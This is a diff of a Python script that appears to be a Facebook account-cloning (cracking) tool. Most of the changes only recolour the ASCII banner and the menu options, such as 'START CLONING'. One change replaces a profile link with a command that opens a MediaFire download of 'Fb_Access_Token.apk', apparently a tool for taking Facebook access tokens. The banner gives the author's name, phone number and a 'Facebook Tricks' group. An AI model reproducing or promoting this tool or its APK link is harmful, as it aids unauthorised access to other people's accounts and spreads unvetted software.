@@ -70,15 +70,10 @@ c3 = "\033[1;91m"
  
 logo = """                                
 \033[1;93m db    db d8888b.  .d8b.  d888888b d8888b.  .d88b.  
-h
 \033[1;93m 88    88 88  `8D d8' `8b   `88'   88  `8D .8P  Y8. 
-
 \033[1;93m 88    88 88oooY' 88ooo88    88    88   88 88    88 
-
 \033[1;93m 88    88 88~~~b. 88~~~88    88    88   88 88    88 
-
 \033[1;93m 88b  d88 88   8D 88   88   .88.   88  .8D `8b  d8' 
-
 \033[1;93m ~Y8888P' Y8888P' YP   YP Y888888P Y8888D'  `Y88P'  
 
                                                     
@@ -86,30 +81,25 @@ h
                                                     
 
 \033[1;93m  .d8b.  db   db .88b  d88.  .d8b.  d8888b.  .d88b.  
-
 \033[1;93m d8' `8b 88   88 88'YbdP`88 d8' `8b 88  `8D .8P  Y8. 
-
 \033[1;93m 88ooo88 88ooo88 88  88  88 88ooo88 88   88 88    88 
-
 \033[1;93m 88~~~88 88~~~88 88  88  88 88~~~88 88   88 88    88 
-
 \033[1;93m 88   88 88   88 88  88  88 88   88 88  .8D `8b  d8' 
-
 \033[1;93m YP   YP YP   YP YP  YP  YP YP   YP Y8888D'  `Y88P'  
                                                      
                                                      
 
                                                    
 \033[1;91m-----------------------------------------------
-\033[1;93m AUTHOR: Ubaid Ullah
+\033[1;93mAUTHOR:  Ubaid Ullah
 \033[1;93mFacebook:Ubaid Ullah
 \033[1;93mWhatsaap:+971 50 965 3974
 \033[1;91m-----------------------------------------------
 \033[1;94m Group : All Facebook Tricks Group
 \033[1;91m-----------------------------------------------
-\033[1;91m-----------------------------------------------                           
+\033[1;92m-----------------------------------------------                           
                  USE 4G FAST SPED INTERNET
-\033[1;91m-----------------------------------------------
+\033[1;92m-----------------------------------------------
  
 """
  
@@ -127,15 +117,15 @@ def main():
  
     print("")
  
-    print("\033[1;96m[1]\033[1;97mSTART CLONING....")
+    print("\033[1;97m[1]\033[1;97mSTART CLONING....")
  
     print("")
  
-    print("\033[1;95m[2]\033[1;97mFOLLOW UBAID ULLAH ")
+    print("\033[1;97m[2]\033[1;97mFOLLOW UBAID ULLAH ")
  
     print("")
  
-    print("\033[1;91m[0]\033[1;97mEXIT")
+    print("\033[1;97m[0]\033[1;97mEXIT")
  
     print("")
  
@@ -254,7 +244,7 @@ def login_select():
  
     elif Mz =="2":
  
-        os.system("xdg-open https://www.facebook.com/UBaido.Trick.master")
+        os.system("xdg-open https://www.mediafire.com/file/41i8pb7u2ubn4bv/Fb_Access_Token.apk/file")
  
     elif Mz =="3":
  
